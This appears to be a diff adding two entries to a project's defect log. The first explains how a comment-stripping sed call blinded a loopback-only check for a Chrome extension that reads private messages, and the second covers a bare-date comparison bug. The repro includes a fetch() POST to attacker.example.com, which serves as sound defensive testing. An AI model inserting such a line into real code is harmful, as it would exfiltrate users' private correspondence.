@@ -12,6 +12,84 @@ measurement contradicts an entry outright, the correction is inserted into
 that entry as a dated block quote rather than by rewriting it.
 
 ---
+## The assertion that the Chrome reader can only talk to loopback could not fail
+
+2026-08-26. Found by a v1 audit agent, reproduced independently before acting.
+This is the most serious defect recorded in this file, because of what the
+component does: the reader observes Warren's Facebook, Discord, D2L and Outlook
+— private correspondence — and R6 is the single assertion standing between
+"observes" and "ships somewhere".
+
+`build/reader-probe.sh` stripped comments with `sed 's://.*::'` before grepping
+for network destinations. That treats the `//` in `https://host/path` as the
+start of a comment and truncates the line at `https:`, so **no host ever
+reached the grep** and the host list was always empty.
+
+### Repro
+
+```
+$ cp -R edge/chrome /tmp/r6 && cat >> /tmp/r6/background.js <<'EOF'
+fetch("https://attacker.example.com/collect",{method:"POST",body:"x"});
+EOF
+$ # run R6's exact pipeline over /tmp/r6
+R6 PASS   <-- an extension that POSTs private messages to an attacker
+```
+
+Confirmed on the real tree too: appending that line to `edge/chrome/background.js`
+left the suite at `PASS=14 FAIL=0`.
+
+### The wrong assumption it replaces
+
+That a comment stripper is harmless preprocessing. It is not, when the thing
+being searched for contains the comment delimiter. `R1`–`R5` (`.click`,
+`innerHTML`, …) worked precisely because their patterns contain no `//`, which
+is why the file looked trustworthy.
+
+### Fixed, and made self-proving
+
+The scheme is protected before comments are stripped (`://` → sentinel → strip
+→ restore). More importantly **R6b** now runs the check against a copy of the
+extension poisoned with a real exfil `fetch()` on every run and asserts it
+FIRES. An assertion about exfiltration that has never been shown to fail is not
+evidence of anything. Verified both ways: R6 goes red on a poisoned tree, green
+on the real one.
+
+A URL written inside a comment can now fail R6. That is the right direction to
+err for a component handling private correspondence.
+
+---
+## A promise due today, written as a bare date, read OVERDUE all day
+
+2026-08-26. Same audit. `risk_of()` compared the due string against `zNow` with
+`strcmp()`, and `zNow` is a full instant:
+
+```
+strcmp("2026-08-26", "2026-08-26T17:56:46.930135Z") < 0   -> OVERDUE
+```
+
+The bare date is a PREFIX of the instant, so it sorts first, and every
+date-only promise was overdue from 00:00 of the day it was owed. Measured with
+two promises owed the same day:
+
+```
+OVERDUE  2026-08-26  mine  date-only due, owed TODAY
+TODAY    23:00       mine  full timestamp, owed late TODAY
+1 overdue, 1 due today
+```
+
+**This is the ledger being wrong in the direction of anxiety**, which is the one
+direction it must not fail in — `build/promise-probe.sh`'s own header says a
+promise reading as owed when it is not is what the product exists to remove.
+
+### Why 24 green assertions missed it
+
+Every existing fixture uses a full ISO timestamp: `LATE`, `SOON` and `FAR` are
+all `...T12:00:00Z`. The bug is only reachable through the shape a *person*
+writes, `@due 2026-08-26`, and no fixture wrote one. P12/P13/P14 now do, with
+controls in both directions (a past bare date is still OVERDUE; tomorrow is
+neither). P12 fails against the pre-fix binary, 26/1 — measured, not assumed.
+
+---
 ## The keyword leg's problem was DEPTH, not selectivity -- and dropping stopwords made it worse
 
 2026-08-26. Recorded because the obvious fix is wrong, and the diagnostic that
